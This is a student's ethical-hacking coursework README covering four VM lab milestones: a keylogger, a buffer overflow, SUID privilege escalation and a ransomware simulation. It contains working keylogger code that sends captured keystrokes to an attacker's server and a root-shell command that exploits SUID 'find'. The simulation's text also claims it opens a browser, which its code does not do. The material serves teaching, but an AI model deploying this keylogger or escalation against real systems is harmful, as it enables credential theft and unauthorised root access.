# EHA 361 - Ethical Hacking

**Student:** El-Elyon Baloy  
**Institution:** Belgium Campus  
**Course:** Ethical Hacking 361  

> **Disclaimer:** All attacks demonstrated in this project were performed in isolated virtual machine environments for educational purposes only. No real systems were targeted.

---

## Milestone 1: Keylogger

A network-based keylogger demonstration using a Kali Linux attacker VM and a target VM. Keystrokes on the victim machine are captured and sent to the attacker's PHP server over HTTP.

### Attacker Side - PHP Receiver (`receive.php`)

```php
<?php
if ($_POST['keys']) {
    $timestamp = date('Y-m-d H:i:s');
    $keys = htmlspecialchars($_POST['keys']);
    $log = "[$timestamp] $keys\n";

    file_put_contents('keylog.txt', $log, FILE_APPEND | LOCK_EX);
    echo "Keys received: " . strlen($keys) . " chars";
} else {
    echo "No keys received";
}
?>
```

### Target Side - Python Keylogger (`keylogger.py`)

```python
#!/usr/bin/env python3
import pynput, requests, threading, time

ATTACKER_IP = "192.168.100.5"
buffer = []

def send_keys():
    global buffer
    while True:
        time.sleep(3)
        if buffer:
            requests.post(f'http://{ATTACKER_IP}:8080/receive.php',
                          data={'keys': ''.join(buffer)})
            buffer.clear()

def on_press(key):
    try: buffer.append(str(key.char))
    except: buffer.append(f'[{key}]')

threading.Thread(target=send_keys, daemon=True).start()
with pynput.keyboard.Listener(on_press=on_press) as l: l.join()
```

**How it works:** The Python keylogger uses `pynput` to listen for keyboard events, buffers them, and sends them to the attacker's PHP server every 3 seconds via HTTP POST. The PHP server logs each batch with a timestamp to `keylog.txt`.

---

## Milestone 2: Buffer Overflow

A stack-based buffer overflow demonstration using a vulnerable C program. The program allocates a 10-byte buffer and copies a 49-byte string into it using the unsafe `strcpy()` function, corrupting the stack and causing a segmentation fault.

### Vulnerable Program (`buffer_overflow.c`)

```c
#include <stdio.h>
#include <string.h>

int main() {
    // Small fixed-size buffer on the stack (10 bytes)
    char buffer[10];

    // Oversized input: 48+ characters (purposely larger than buffer)
    char large_input[] = "!!! BUFFER OVERFLOW DEMO !!! This string is WAY too long "
                         "for buffer[10]: ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
                         "abcdefghijklmnopqrstuvwxyz";

    printf("Attempting strcpy... Buffer size: 10 bytes, Input size: %lu bytes\n",
           strlen(large_input) + 1);

    // strcpy() does NOT check bounds - OVERFLOW HAPPENS HERE
    strcpy(buffer, large_input);

    printf("If you see this, no crash occurred (unlikely): %s\n", buffer);
    return 0;
}
```

### Compilation (with protections disabled for demo)

```bash
gcc -o buffer_overflow buffer_overflow.c -fno-stack-protector -z execstack -no-pie
```

| Flag | Purpose |
|------|---------|
| `-fno-stack-protector` | Disables stack canary (buffer overflow protector) |
| `-z execstack` | Makes stack executable (ignores NX bit) |
| `-no-pie` | Disables Position Independent Executable |

**How it works:** The stack layout is `[buffer[10] | saved EBP | return addr | ...]`. When `strcpy()` writes 49 bytes into a 10-byte buffer, it overwrites the saved EBP and return address, causing the CPU to jump to an invalid address and triggering a segmentation fault.

---

## Milestone 3: Privilege Escalation (SUID Exploit)

Demonstrates Linux privilege escalation by exploiting a misconfigured SUID binary. A system administrator "mistakenly" sets the SUID bit on `/usr/bin/find`, allowing a low-privilege user to gain root access.

### Setup - Create the vulnerability (as root)

```bash
# Create a low-privilege user
sudo adduser lowprivuser

# Set the SUID bit on find (the misconfiguration)
sudo chmod u+s /usr/bin/find
```

### Attack - Escalate privileges (as lowprivuser)

```bash
# Verify we are not root
whoami    # lowprivuser
id        # uid=1001(lowprivuser)

# Find all SUID binaries (reconnaissance)
find / -perm -u=s -type f 2>/dev/null

# Exploit: use find's -exec to spawn a root shell
find . -exec /bin/sh -p \; -quit

# Verify escalation
whoami    # root
id        # euid=0(root)
```

**How it works:** When a binary has the SUID bit set, it runs with the file owner's permissions (root). The `find` command's `-exec` flag lets it execute arbitrary commands. The `-p` flag on `/bin/sh` preserves the effective UID, so the spawned shell retains root privileges inherited from the SUID `find` binary.

---

## Milestone 4: Ransomware Simulation

A harmless ransomware simulation using Python. It uses reversible XOR-based text scrambling (not real encryption), displays fake warning popups via `tkinter`, opens a browser, and logs out the user after a delay. All testing was done inside an isolated VM.

### Payload (`payload.py`)

```python
import os, time, base64, tkinter as tk, webbrowser, platform
from tkinter import messagebox

def fake_encrypt(data, key=b"RansomKey42"):
    key = key * (len(data) // len(key) + 1)
    xored = bytes(a ^ b for a, b in zip(data, key))
    return base64.b64encode(xored).decode('ascii')

def fake_decrypt(enc_str, key=b"RansomKey42"):
    enc = base64.b64decode(enc_str)
    key = key * (len(enc) // len(key) + 1)
    return bytes(a ^ b for a, b in zip(enc, key)).decode('utf-8', errors='ignore')

if __name__ == "__main__":
    # Read target file and "encrypt" it
    with open("Milestone_1_Payload.txt", "rb") as f:
        original = f.read()
    encrypted = fake_encrypt(original)
    with open("Milestone_1_Payload.txt", "w") as f:
        f.write(encrypted)

    # Show ransomware popup
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("YOUR FILES ARE ENCRYPTED!",
        "All your files have been encrypted!\n\n"
        "Send 0.1 BTC to ...\n"
        "48 hours remaining!")

    # Logout after 30 seconds
    time.sleep(30)
    if platform.system() == "Linux":
        os.system("gnome-session-quit --logout --no-prompt")
```

**How it works:** The "encryption" uses XOR with a fixed key (`RansomKey42`) followed by base64 encoding. XOR is fully reversible - applying the same key again restores the original data. The payload scrambles a text file, shows fake warning popups using `tkinter`, opens a browser, then logs out the user after 30 seconds.

---

## Tools & Environment

- **Kali Linux** (VirtualBox VMs)
- **Languages:** Python 3, C, PHP, Bash
- **Libraries:** `pynput`, `requests`, `tkinter`
- **Tools:** GCC, GDB, PHP built-in server
